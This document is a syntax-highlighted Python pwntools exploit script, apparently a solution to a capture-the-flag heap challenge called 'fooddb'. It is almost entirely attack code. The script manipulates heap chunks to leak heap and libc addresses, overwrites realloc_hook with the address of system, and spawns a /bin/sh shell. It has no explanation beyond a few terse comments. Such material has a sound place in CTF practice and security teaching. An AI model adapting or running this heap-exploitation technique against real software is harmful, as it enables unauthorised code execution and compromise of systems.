<div class="highlight"><pre><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;info&#39;</span><span class="p">)</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span>
<span class="k">def</span> <span class="nf">e</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;&#39;</span> <span class="o">+</span> <span class="s">&#39;Q&#39;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">),</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./fooddb&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">del_type</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;6&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;remove :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show_food</span><span class="p">():</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;Menu&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">edit_food</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;edit :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;name :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;food :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">add_food</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;name :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">del_food</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;delete :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">quit</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;7&#39;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
	<span class="n">del_food</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>

<span class="c">###///////////////////////////////////del</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
	<span class="n">del_food</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>


<span class="c">#//////////////////////////////leak heap</span>
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">show_food</span><span class="p">()</span>
<span class="k">print</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
<span class="n">heapbase</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Name : (......)</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">heapbase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heapbase</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
<span class="k">print</span> <span class="s">&#39;heapbase : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heapbase</span><span class="p">)</span>
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>


<span class="c">#//////////////////////////////////////////////////don&#39;t know what is this doing</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
	<span class="n">del_type</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mi">720</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80\x00</span><span class="s">&#39;</span><span class="p">)</span>	
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="o">*</span><span class="mi">766</span><span class="p">)</span>	
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mi">720</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80\x00</span><span class="s">&#39;</span><span class="p">)</span>	
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="o">*</span><span class="mi">766</span><span class="p">)</span>	
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="o">*</span><span class="mi">766</span><span class="p">)</span>	
<span class="n">del_food</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>


<span class="c">##/////////////////////////////////////////////////////////////////////leak libc</span>
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;Q&#39;</span><span class="o">*</span><span class="mi">117</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">)</span>	
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;P&#39;</span><span class="o">*</span><span class="mi">117</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">)</span>	
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;edit :&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;name :&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">+</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
	<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">):</span>
	<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;C&#39;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;DD&#39;</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>
<span class="n">edit_food</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heapbase</span> <span class="o">+</span> <span class="mh">0x950</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">))</span>



<span class="n">data</span> <span class="o">=</span> <span class="n">show_food</span><span class="p">()</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;2. Name : (......)</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x000000000039eb30</span> <span class="o">-</span> <span class="mh">0x12</span>
<span class="k">print</span> <span class="s">&#39;libc_base: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>

<span class="n">realloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000039eb28</span>
<span class="k">print</span> <span class="s">&#39;realloc_hook: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">realloc_hook</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000003f890</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s">&#39;b&#39;</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80</span><span class="s">&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc_hook</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">)</span>


<span class="c">##//////////////////////////////////////////////////////////////////overwrite</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
	<span class="n">del_food</span><span class="p">(</span><span class="mi">17</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>


<span class="n">add_food</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">edit_food</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">))</span>
<span class="c">#add_food(&#39;/bin/sh;#\0&#39;)</span>
<span class="n">add_food</span><span class="p">(</span><span class="s">&#39;/bin/sh</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice :&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;edit :&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;name :&#39;</span><span class="p">)</span>
<span class="c">#p.sendline(&#39;\x00&#39; + &#39;a&#39;*8)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">88</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>